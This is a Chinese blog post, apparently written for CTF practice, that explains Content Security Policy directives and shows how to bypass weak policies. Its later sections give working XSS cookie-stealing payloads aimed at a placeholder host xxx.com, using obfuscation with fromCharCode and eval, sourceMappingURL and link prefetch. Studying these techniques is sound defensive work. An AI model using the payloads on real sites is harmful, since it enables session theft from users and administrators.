<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言：由于最近在打比赛时经常遇到各种CSP知识因此自己总结一波。 什么是CSP?12通过声明允许通过HTTP标头加载哪些动态资源，新的Content-Security-Policy HTTP响应标头可帮助您降低现代浏览器的XSS风险。  CSP(内容安全策略)在HTTP响应头中规定，可以减少XSS攻击。如下所示：1Content-Security-Policy: default-src &amp;apos">
<meta property="og:type" content="article">
<meta property="og:title" content="CSP的知识总结和绕过">
<meta property="og:url" content="http://yoursite.com/2019/10/06/CSP的知识总结和绕过/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言：由于最近在打比赛时经常遇到各种CSP知识因此自己总结一波。 什么是CSP?12通过声明允许通过HTTP标头加载哪些动态资源，新的Content-Security-Policy HTTP响应标头可帮助您降低现代浏览器的XSS风险。  CSP(内容安全策略)在HTTP响应头中规定，可以减少XSS攻击。如下所示：1Content-Security-Policy: default-src &amp;apos">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-10-06T13:12:28.964Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CSP的知识总结和绕过">
<meta name="twitter:description" content="前言：由于最近在打比赛时经常遇到各种CSP知识因此自己总结一波。 什么是CSP?12通过声明允许通过HTTP标头加载哪些动态资源，新的Content-Security-Policy HTTP响应标头可帮助您降低现代浏览器的XSS风险。  CSP(内容安全策略)在HTTP响应头中规定，可以减少XSS攻击。如下所示：1Content-Security-Policy: default-src &amp;apos">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/10/06/CSP的知识总结和绕过/">





  <title>CSP的知识总结和绕过 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/06/CSP的知识总结和绕过/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CSP的知识总结和绕过</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-06T20:40:29+08:00">
                2019-10-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  24
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>由于最近在打比赛时经常遇到各种CSP知识因此自己总结一波。</p>
<h4 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP?"></a>什么是CSP?</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过声明允许通过HTTP标头加载哪些动态资源，</span><br><span class="line">新的Content-Security-Policy HTTP响应标头可帮助您降低现代浏览器的XSS风险。</span><br></pre></td></tr></table></figure>

<h4 id="CSP-内容安全策略-在HTTP响应头中规定，可以减少XSS攻击。如下所示："><a href="#CSP-内容安全策略-在HTTP响应头中规定，可以减少XSS攻击。如下所示：" class="headerlink" title="CSP(内容安全策略)在HTTP响应头中规定，可以减少XSS攻击。如下所示："></a>CSP(内容安全策略)在HTTP响应头中规定，可以减少XSS攻击。如下所示：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; cdn.example.com;</span><br></pre></td></tr></table></figure>

<h4 id="指令参考："><a href="#指令参考：" class="headerlink" title="指令参考："></a>指令参考：</h4><h5 id="1-不同指令间用-隔开"><a href="#1-不同指令间用-隔开" class="headerlink" title="1.不同指令间用;隔开"></a>1.不同指令间用<code>;</code>隔开</h5><h5 id="2-同一指令的多个指令之间用空格分隔"><a href="#2-同一指令的多个指令之间用空格分隔" class="headerlink" title="2.同一指令的多个指令之间用空格分隔"></a>2.同一指令的多个指令之间用空格分隔</h5><h5 id="3-指令值除了URL都要用引号包裹"><a href="#3-指令值除了URL都要用引号包裹" class="headerlink" title="3.指令值除了URL都要用引号包裹"></a>3.指令值除了URL都要用引号包裹</h5><h5 id="4-指令重复，则以第一个为准"><a href="#4-指令重复，则以第一个为准" class="headerlink" title="4.指令重复，则以第一个为准"></a>4.指令重复，则以第一个为准</h5><table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">示例</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">default-src</td>
<td align="left">‘self’ cdn.example.com</td>
<td align="left">定义资源默认加载策略</td>
</tr>
<tr>
<td align="left">script-src</td>
<td align="left">‘self’ js.example.com</td>
<td align="left">定义 JS 的加载策略</td>
</tr>
<tr>
<td align="left">img-src</td>
<td align="left">‘self’ img.example.com</td>
<td align="left">定义图片的加载策略</td>
</tr>
<tr>
<td align="left">style-src</td>
<td align="left">‘self’ css.example.com</td>
<td align="left">定义样式表的加载策略</td>
</tr>
<tr>
<td align="left">font-src</td>
<td align="left">font.example.com</td>
<td align="left">定义字体的加载策略、</td>
</tr>
<tr>
<td align="left">object-src</td>
<td align="left">‘self’</td>
<td align="left">定义引用资源的加载策略，如 <object> <embed> <applet>等</applet></object></td>
</tr>
<tr>
<td align="left">media-src</td>
<td align="left">media.example.com</td>
<td align="left">定义音频和视频的加载策略，如 HTML5 中的 <audio> <video></video></audio></td>
</tr>
<tr>
<td align="left">connect-src</td>
<td align="left">‘self’</td>
<td align="left">定义 Ajax、WebSocket 等的加载策略</td>
</tr>
<tr>
<td align="left">frame-src</td>
<td align="left">‘self’</td>
<td align="left">定义 frame 的加载策略，不赞成使用，改用 child-src</td>
</tr>
</tbody></table>
<h4 id="详细的source-list："><a href="#详细的source-list：" class="headerlink" title="详细的source list："></a>详细的source list：</h4><table>
<thead>
<tr>
<th align="left">源值</th>
<th align="left">示例</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">img-src *</td>
<td align="left">通配符，允许除 data: blob: filesystem: 协议之外的任意 URL</td>
</tr>
<tr>
<td align="left">‘none’</td>
<td align="left">object-src ‘none’</td>
<td align="left">不允许加载任何资源</td>
</tr>
<tr>
<td align="left">‘self’</td>
<td align="left">script-src ‘self’</td>
<td align="left">允许加载同域(即同域名、同协议、同端口)下的资源</td>
</tr>
<tr>
<td align="left">data:</td>
<td align="left">img-src ‘self’ data:</td>
<td align="left">允许通过<code>data</code>协议加载资源如 data:image/jpeg;  base64,base64_encode_data</td>
</tr>
<tr>
<td align="left">domain.example.com</td>
<td align="left">img-src domain.example.com</td>
<td align="left">允许加载指定域名下的资源</td>
</tr>
<tr>
<td align="left">*.example.com</td>
<td align="left">img-src *.example.com</td>
<td align="left">允许加载 example.com 下所有子域名的资源</td>
</tr>
<tr>
<td align="left">‘unsafe-inline’</td>
<td align="left">script-src ‘unsafe-inline’</td>
<td align="left">允许执行内联资源，如样式属性、事件、script 标签</td>
</tr>
<tr>
<td align="left">‘unsafe-eval’</td>
<td align="left">script-src ‘unsafe-eval’</td>
<td align="left">允许不安全的动态代码执行，如 JS 中的 eval() 函数</td>
</tr>
<tr>
<td align="left"><a href="https://cdn.com" target="_blank" rel="noopener">https://cdn.com</a></td>
<td align="left">img-src <a href="https://cdn.com" target="_blank" rel="noopener">https://cdn.com</a></td>
<td align="left">只允许给定域名下的通过 HTTPS 连接的资源</td>
</tr>
<tr>
<td align="left">https:</td>
<td align="left">img-src https:</td>
<td align="left">只允许通过 HTTPS 连接的资源</td>
</tr>
</tbody></table>
<h4 id="绕过不安全的CSP："><a href="#绕过不安全的CSP：" class="headerlink" title="绕过不安全的CSP："></a>绕过不安全的CSP：</h4><h4 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure>

<h5 id="当开启了这个选项时，意味着可以执行内联资源，包括-JS、样式表等"><a href="#当开启了这个选项时，意味着可以执行内联资源，包括-JS、样式表等" class="headerlink" title="当开启了这个选项时，意味着可以执行内联资源，包括 JS、样式表等"></a>当开启了这个选项时，意味着可以执行内联资源，包括 JS、样式表等</h5><h5 id="假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的-Cookie。"><a href="#假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的-Cookie。" class="headerlink" title="假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的 Cookie。"></a>假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的 Cookie。</h5><h5 id="在没有过滤的条件下我们可以这样"><a href="#在没有过滤的条件下我们可以这样" class="headerlink" title="在没有过滤的条件下我们可以这样"></a>在没有过滤的条件下我们可以这样</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://xxx.com'</span>+<span class="built_in">document</span>.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">'http://xxx.com'</span>+<span class="built_in">document</span>.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> i = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span></span><br><span class="line"><span class="javascript">i.src = <span class="string">'http://xxx.com'</span> + <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(i);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="过滤了点"><a href="#过滤了点" class="headerlink" title="过滤了点"></a>过滤了点</h4><h5 id="Google-CTF-2016-Wallowing-Wallabies-Part-Three"><a href="#Google-CTF-2016-Wallowing-Wallabies-Part-Three" class="headerlink" title="Google CTF 2016 Wallowing Wallabies - Part Three"></a>Google CTF 2016 Wallowing Wallabies - Part Three</h5><h5 id="过滤了所有的点，属性的点可以用-‘’-的形式来代替，URL-我们可以用-String-fromCharCode-函数，所以最后的-payload-是"><a href="#过滤了所有的点，属性的点可以用-‘’-的形式来代替，URL-我们可以用-String-fromCharCode-函数，所以最后的-payload-是" class="headerlink" title="过滤了所有的点，属性的点可以用 [‘’] 的形式来代替，URL 我们可以用 String.fromCharCode 函数，所以最后的 payload 是"></a>过滤了所有的点，属性的点可以用 [‘’] 的形式来代替，URL 我们可以用 String.fromCharCode 函数，所以最后的 payload 是</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> i = <span class="built_in">document</span>[<span class="string">'createElement'</span>](<span class="string">'img'</span>);</span></span><br><span class="line"><span class="javascript">i[<span class="string">'src'</span>] = <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](http:<span class="comment">//xxx.com 所对应的 Ascii 码，用逗号分隔) + document['cookie'];</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>[<span class="string">'body'</span>][<span class="string">'appendChild'</span>](i);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="过滤了大部分关键字"><a href="#过滤了大部分关键字" class="headerlink" title="过滤了大部分关键字"></a>过滤了大部分关键字</h4><h5 id="ZCTF-2017-中就碰到了这样一道题。"><a href="#ZCTF-2017-中就碰到了这样一道题。" class="headerlink" title="ZCTF 2017 中就碰到了这样一道题。"></a>ZCTF 2017 中就碰到了这样一道题。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">)</span><br><span class="line">eval</span><br><span class="line">document</span><br><span class="line">location</span><br><span class="line">href</span><br><span class="line">window</span><br><span class="line">src</span><br><span class="line">svg</span><br><span class="line">img</span><br></pre></td></tr></table></figure>

<h4 id="这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的-Twitter-中的一个-payload"><a href="#这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的-Twitter-中的一个-payload" class="headerlink" title="这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的 Twitter 中的一个 payload"></a>这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的 Twitter 中的一个 payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;//# sourceMappingURL=https://xxx.com/?$&#123;escape(document.cookie)&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="因为我们不用获取-Cookie，所以完全可以实现我们的要求"><a href="#因为我们不用获取-Cookie，所以完全可以实现我们的要求" class="headerlink" title="因为我们不用获取 Cookie，所以完全可以实现我们的要求"></a>因为我们不用获取 Cookie，所以完全可以实现我们的要求</h5><h5 id="PS：-sourceMappingURL-是用来请求一个-map-文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试"><a href="#PS：-sourceMappingURL-是用来请求一个-map-文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试" class="headerlink" title="PS：//# sourceMappingURL 是用来请求一个 .map 文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试"></a>PS：//# sourceMappingURL 是用来请求一个 .map 文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试</h5><h5 id="还有就是这个指令值出现在-style-src-中"><a href="#还有就是这个指令值出现在-style-src-中" class="headerlink" title="还有就是这个指令值出现在 style-src 中"></a>还有就是这个指令值出现在 style-src 中</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure>

<h4 id="Pwnhub-蓝猫师傅出的一道题-打开电脑，-CSP-是长这样的"><a href="#Pwnhub-蓝猫师傅出的一道题-打开电脑，-CSP-是长这样的" class="headerlink" title="Pwnhub 蓝猫师傅出的一道题 打开电脑， CSP 是长这样的"></a>Pwnhub 蓝猫师傅出的一道题 打开电脑， CSP 是长这样的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src *; img-src * data: blob:; frame-src &apos;self&apos;; script-src &apos;self&apos; cdn.bootcss.com &apos;unsafe-eval&apos;; style-src &apos;self&apos; cdn.bootcss.com &apos;unsafe-inline&apos;; connect-src * wss:;</span><br></pre></td></tr></table></figure>

<h4 id="我们可以提交一条-md5-值，后台显示方式和前段差不多，即"><a href="#我们可以提交一条-md5-值，后台显示方式和前段差不多，即" class="headerlink" title="我们可以提交一条 md5 值，后台显示方式和前段差不多，即"></a>我们可以提交一条 md5 值，后台显示方式和前段差不多，即</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;modal&quot; class=&quot;detail&quot; href=&quot;#detail&quot; data-toggle=&quot;modal&quot; contributor=aaangelwhu hexdata=672e65613167722e333170366572657265726572657265&gt;fffffffffffe53cdbc640fffb934cfb8&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h5 id="因为有-htmlspecialchars，对-lt-“-进行了转义，即我们跳不出这个标签，所以不能用-script-标签，但是我们注意到-hexdata-是没有引号的，而且这个字段又是我们可控的，结合-style-src-的-unsafe-inline-值，可以在标签内使用内联样式"><a href="#因为有-htmlspecialchars，对-lt-“-进行了转义，即我们跳不出这个标签，所以不能用-script-标签，但是我们注意到-hexdata-是没有引号的，而且这个字段又是我们可控的，结合-style-src-的-unsafe-inline-值，可以在标签内使用内联样式" class="headerlink" title="因为有 htmlspecialchars，对 &lt; “ 进行了转义，即我们跳不出这个标签，所以不能用 script 标签，但是我们注意到 hexdata 是没有引号的，而且这个字段又是我们可控的，结合 style-src 的 unsafe-inline 值，可以在标签内使用内联样式"></a>因为有 htmlspecialchars，对 &lt; “ 进行了转义，即我们跳不出这个标签，所以不能用 script 标签，但是我们注意到 hexdata 是没有引号的，而且这个字段又是我们可控的，结合 style-src 的 unsafe-inline 值，可以在标签内使用内联样式</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">style=background-image:url(http://xxx.com)</span><br><span class="line">style=background:url(http://xxx.com)</span><br></pre></td></tr></table></figure>

<h5 id="background-image-属性是用来为元素设置背景图像的"><a href="#background-image-属性是用来为元素设置背景图像的" class="headerlink" title="background-image 属性是用来为元素设置背景图像的"></a>background-image 属性是用来为元素设置背景图像的</h5><h4 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;</span><br></pre></td></tr></table></figure>

<h5 id="当上面的-unsafe-inline-和-unsafe-eval-都开启时，将会变得很危险"><a href="#当上面的-unsafe-inline-和-unsafe-eval-都开启时，将会变得很危险" class="headerlink" title="当上面的 unsafe-inline 和 unsafe-eval 都开启时，将会变得很危险"></a>当上面的 unsafe-inline 和 unsafe-eval 都开启时，将会变得很危险</h5><h5 id="因为你过滤的一些关键字都可以用-eval-函数来绕过，比如"><a href="#因为你过滤的一些关键字都可以用-eval-函数来绕过，比如" class="headerlink" title="因为你过滤的一些关键字都可以用 eval 函数来绕过，比如"></a>因为你过滤的一些关键字都可以用 eval 函数来绕过，比如</h5><h5 id="我们先对最基本的-payload-用-String-fromCharCode-函数来处理"><a href="#我们先对最基本的-payload-用-String-fromCharCode-函数来处理" class="headerlink" title="我们先对最基本的 payload 用 String.fromCharCode 函数来处理"></a>我们先对最基本的 payload 用 String.fromCharCode 函数来处理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.location=http://xxx.com+document.cookie</span><br><span class="line">String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 104, 116, 116, 112, 58, 47, 47, 120, 120, 120, 46, 99, 111, 109, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101)</span><br></pre></td></tr></table></figure>

<h5 id="再用-eval-函数执行"><a href="#再用-eval-函数执行" class="headerlink" title="再用 eval 函数执行"></a>再用 eval 函数执行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 104, 116, 116, 112, 58, 47, 47, 120, 120, 120, 46, 99, 111, 109, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101))&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="这样就避开了很多关键字，当然不保证会直接过滤掉-eval"><a href="#这样就避开了很多关键字，当然不保证会直接过滤掉-eval" class="headerlink" title="这样就避开了很多关键字，当然不保证会直接过滤掉 eval"></a>这样就避开了很多关键字，当然不保证会直接过滤掉 eval</h5><h4 id="Link-Prefetch"><a href="#Link-Prefetch" class="headerlink" title="Link Prefetch"></a>Link Prefetch</h4><h5 id="在-HTML5-中有一个新特性，Link-Prefetch-页面资源预加载-，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度"><a href="#在-HTML5-中有一个新特性，Link-Prefetch-页面资源预加载-，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度" class="headerlink" title="在 HTML5 中有一个新特性，Link Prefetch(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度"></a>在 HTML5 中有一个新特性，Link Prefetch(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度</h5><h5 id="官方的定义"><a href="#官方的定义" class="headerlink" title="官方的定义"></a>官方的定义</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Link prefetching is a browser mechanism, which utilizes browser idle time to download or prefetch documents that the user might visit in the near future. A web page provides a set of prefetching hints to the browser, and after the browser is finished loading the page, it begins silently prefetching specified documents and stores them in its cache. When the user visits one of the prefetched documents, it can be served up quickly out of the browser&apos;s cache.</span><br></pre></td></tr></table></figure>

<h5 id="下面就说下几种可以实现预加载的方式"><a href="#下面就说下几种可以实现预加载的方式" class="headerlink" title="下面就说下几种可以实现预加载的方式"></a>下面就说下几种可以实现预加载的方式</h5><h4 id="prefetch"><a href="#prefetch" class="headerlink" title="prefetch"></a>prefetch</h4><h5 id="一般是通过-link-标签来实现预加载的指令"><a href="#一般是通过-link-标签来实现预加载的指令" class="headerlink" title="一般是通过 link 标签来实现预加载的指令"></a>一般是通过 link 标签来实现预加载的指令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://xxx.com&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="但是在标签内的话是没办法打到-Cookie-的，但如果我们可以执行内联-JS，情况就不一样了"><a href="#但是在标签内的话是没办法打到-Cookie-的，但如果我们可以执行内联-JS，情况就不一样了" class="headerlink" title="但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了"></a>但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure>

<h5 id="如果-CSP-头是这样的，我们可以通过利用-JS-创建-link-标签的方式打到-Cookie"><a href="#如果-CSP-头是这样的，我们可以通过利用-JS-创建-link-标签的方式打到-Cookie" class="headerlink" title="如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie"></a>如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">const</span> i=<span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span></span><br><span class="line"><span class="javascript">	i.setAttribute(<span class="string">'rel'</span>,<span class="string">'prefetch'</span>);</span></span><br><span class="line"><span class="javascript">	i.setAttribute(<span class="string">'href'</span>,<span class="string">'http://xxx.com?'</span>+<span class="built_in">document</span>.cookie);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.head.appendChild(i);	</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

